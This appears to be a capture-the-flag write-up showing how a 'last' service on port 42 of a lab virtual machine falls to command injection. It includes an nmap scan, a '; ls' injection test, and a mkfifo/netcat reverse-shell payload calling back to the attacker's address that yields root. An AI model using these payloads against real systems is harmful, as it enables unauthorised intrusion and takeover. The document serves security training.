# 🏗️ Challenge Lambda
## 🔭 Port Scan
Scanning the virtual machine with the help of `nmap` we find an unidentified service running on TCP port 42. 

```bash
nmap -v -A 192.168.57.100
```

Full results on file `nmap_results.txt`.

## 🔬 Service on Port 42
To inspect the service running on port 42 we can try to interact with it using `nc`:

```bash
nc 192.168.57.100 42
```

Providing no input yields the following result:
```bash
Welcome to the on--line and interactive "last" server
Enter a username to see the users last login time: 
reboot   system boot  5.3.0-42-generic Fri Apr 28 17:29   still running
lambdaha pts/0        192.168.147.89   Fri Mar 27 14:08 - 14:13  (00:04)
lambdaha tty1                          Fri Mar 27 14:01 - down   (00:11)
reboot   system boot  5.3.0-42-generic Fri Mar 27 13:59 - 14:13  (00:13)
lambdaha tty1                          Fri Mar 20 19:11 - down  (3+23:29)
alphause tty1                          Fri Mar 20 18:26 - 19:11  (00:44)
root     tty1                          Fri Mar 20 18:25 - 18:26  (00:01)
reboot   system boot  5.3.0-42-generic Fri Mar 20 18:24 - 18:41 (4+00:16)
lambdaha pts/3        192.168.147.89   Fri Mar 20 16:30 - 18:24  (01:53)
lambdaha pts/2        192.168.147.89   Wed Mar 18 14:00 - 18:24 (2+04:23)
lambdaha pts/1        192.168.147.89   Wed Mar 18 13:24 - 18:24 (2+04:59)
lambdaha :0           :0               Wed Mar 18 10:34 - down  (2+07:50)
reboot   system boot  5.3.0-42-generic Wed Mar 18 10:25 - 18:24 (2+07:59)
lambdaha pts/1        192.168.147.89   Wed Mar 18 10:21 - 10:25  (00:03)
lambdaha :0           :0               Wed Mar 18 10:06 - down   (00:18)
reboot   system boot  5.3.0-42-generic Wed Mar 18 10:05 - 10:25  (00:19)
lambdaha :0           :0               Wed Mar 18 10:01 - down   (00:03)
reboot   system boot  5.3.0-42-generic Wed Mar 18 10:00 - 10:05  (00:04)

wtmp begins Wed Mar 18 10:00:59 2020
```


Which can fairly easily be identified as the output of `last`. Providing a username results in the output of "`last (username)`" being returned by the server. This would suggest the user input is being passsed to `last` and that a command injection vulnerability might exist.

## 💉 Command Injection
To verify whether command injection is possible, we provide the following as input to the service:

```bash
>/dev/null; ls
```

Yielding the following output:
```bash
Welcome to the on--line and interactive "last" server
Enter a username to see the users last login time: >/dev/null; ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swapfile
sys
tmp
usr
var
```
Which shows the service is, indeed, vulnerable to command injection.
We may then reuse the shellcode used for Challenge Mu to gain shell access to the machine:

```bash
;mkfifo /tmp/dkkr; nc 192.168.57.1 55101 0</tmp/dkkr | /bin/bash >/tmp/dkkr 2>&1; rm /tmp/dkkr
```

While listening with:
```bash
nc -lv 55101
```

Running the command `whoami` shows we are now `root`.

